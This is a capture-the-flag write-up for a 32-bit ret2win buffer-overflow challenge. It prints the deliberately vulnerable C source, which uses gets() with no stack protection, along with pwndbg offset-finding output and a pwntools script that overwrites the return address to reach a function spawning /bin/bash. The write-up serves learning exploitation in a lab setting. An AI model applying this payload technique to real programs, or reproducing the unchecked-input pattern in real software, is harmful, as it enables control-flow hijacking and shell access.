---
title: # Baby Buffer Overflow - 32bit
author: saturn_
pubDate: 2024-10-17
toc: true
share: true
ogImage: true
---

# Baby Buffer Overflow - 32bit 

<p align="center">
  <img src="../../images/logo.jpg" alt="Dombusters" width="25%">
</p>

## Description

Author: @aenygma

Can you command this program to where it cannot go?
To get the flag, you must somehow take control of its excecution.
Is it even possible?

Press the Start button on the top-right to begin this challenge.
Attachments: 

`babybufov`, `babybufov.c`

## Solution

We're given a source file, `babybufov.c`, containing this:

```c
#include <stdio.h>
#include <unistd.h>

//gcc -fno-pie -no-pie -Wno-implicit-function-declaration -fno-stack-protector -m32 babybufov.c -o babybufov

void target(){
    puts("Jackpot!");
    char* executable="/bin/bash";
    char* argv[]={executable, NULL};
    execve(executable,argv,NULL);
}

int vuln(){
    char buf[16];
    gets(buf);
    return 0;
}

int main(){
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
    puts("Gimme some data!");
    fflush(stdout);
    vuln();
    puts("Failed... :(");
}
```

So, we can see that this is a ret2win, so this is trivial! Let's just get the addresses we need in `gdb`, and then we have an easy flag!

```bash
pwndbg> cyclic 120
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
pwndbg> r
Starting program: /home/strn/babybufov
zsh:1: no such file or directory: /home/strn/babybufov
During startup program exited with code 127.
pwndbg>
```

... the fuck?


Turns out, this is not an issue of the executables location. We can run `file` against it with no problem, but executing the file somehow makes it nonexistent again? 

Turns out, this is a problem of the libraries of the executable. We can use `ldd` to check which libraries it tries to link to.
```
$ ldd babybufov
	linux-gate.so.1 (0xeefe9000)
	libc.musl-x86.so.1 => not found
```

Alright, so we have the linux-gate.so.1, but we're missing MUSL. Installing MUSL via `sudo pacman -S musl` doesn't fix our problem, so what we have to do is install MUSL via the AUR via `paru -S aur/i386-musl`.

Let's go back to GDB.

```bash
$  gdb-pwndbg ./babybufov
pwndbg> cyclic 120
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab
pwndbg> r
Gimme some data!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab

Program received signal SIGSEGV, Segmentation fault.
0x61616168 in ?? ()
# SNIP
00:0000│ esp 0xffffd0d0 ◂— 'iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaab'
```

We can get the offset by using the `cyclic` function.

```bash
pwndbg> cyclic -l iaaa
Finding cyclic pattern of 4 bytes: b'iaaa' (hex: 0x69616161)
Found at offset 32
```

Because this is a 32-bit binary, we have to subtract 4 bytes from what we get here, so the offset is *actually* 28. 

Here's the solve script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./babybufov')

exe = context.binary

payload = b'A' * 28
payload += p32(0x8049006) # objdump -d ./babybufov | rg "ret"
payload += p32(exe.symbols['target'])


io = process()

io.sendline(payload)

io.interactive()
```


---
**Dombusters**: _Writeup written by saturn_
